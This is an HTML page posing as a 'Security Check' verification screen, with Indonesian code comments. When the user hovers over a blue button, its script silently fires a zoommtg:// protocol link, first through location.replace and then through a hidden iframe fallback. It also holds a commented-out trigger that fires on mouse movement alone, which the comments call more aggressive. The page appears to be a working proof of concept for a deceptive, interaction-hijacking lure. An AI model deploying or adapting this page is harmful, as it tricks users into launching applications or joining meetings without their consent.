<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #f4f6f8;
    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
    display: flex; justify-content: center; align-items: center;
    height: 100vh; margin: 0;
  }
  .panel {
    background: #fff; padding: 40px; border-radius: 12px;
    box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center;
  }
  h1 { color: #333; margin-bottom: 10px; }
  p { color: #666; margin-bottom: 20px; }
  
  /* Area Pemicu (Hover Target) */
  #hoverTarget {
    background: #007aff;
    color: #fff;
    padding: 20px 40px;
    border-radius: 8px;
    font-size: 18px;
    font-weight: bold;
    cursor: crosshair;
    transition: transform 0.2s;
  }
  #hoverTarget:hover {
    transform: scale(1.05);
    background: #005bb5;
  }
  
  #status { margin-top: 20px; color: #f00; font-weight: bold; }
</style>
</head>
<body>

<div class="panel">
  <h1>🔒 Security Check</h1>
  <p>Gerakkan pointer Anda ke area biru di bawah ini.</p>
  
  <div id="hoverTarget">Hover Here to Verify</div>
  <div id="status"></div>
</div>

<script>
(function () {
  'use strict';

  var target = document.getElementById('hoverTarget');
  var status = document.getElementById('status');
  
  // Skema target (Ganti sesuai kebutuhan)
  var targetScheme = "zoommtg://zoom.us/join?confno=123456789";
  var hasTriggered = false;

  // ============================================
  // 1. TRIGGER VIA MOUSEOVER / MOUSEMOVE
  // ============================================
  target.addEventListener('mouseover', function() {
    if (hasTriggered) return;
    hasTriggered = true;
    
    status.innerText = "Mencoba memicu skema...";
    console.log("[!] Pointer hovered. Triggering protocol...");

    // Coba tembakkan skema
    try {
      // Trik 1: Location replace
      window.location.replace(targetScheme);
      
      // Trik 2: Iframe (jika replace diblokir)
      setTimeout(function() {
        var iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = targetScheme;
        document.body.appendChild(iframe);
      }, 100);

    } catch(e) {
      status.innerText = "Diblokir oleh Browser.";
      console.log("Gagal:", e);
    }
  });

  // ============================================
  // 2. TRIGGER VIA POINTERMOVE (Saat Mouse Bergerak)
  // ============================================
  document.body.addEventListener('pointermove', function(e) {
    // Jika pointer bergerak ke area tertentu, tembakkan
    // (Ini lebih agresif, bisa memicu tanpa disengaja)
    if (e.clientX > window.innerWidth / 2 && !hasTriggered) {
      // Uncomment baris di bawah untuk mengaktifkan trigger via pointermove
      // hasTriggered = true;
      // window.location.replace(targetScheme);
    }
  });

})();
</script>
</body>
</html>
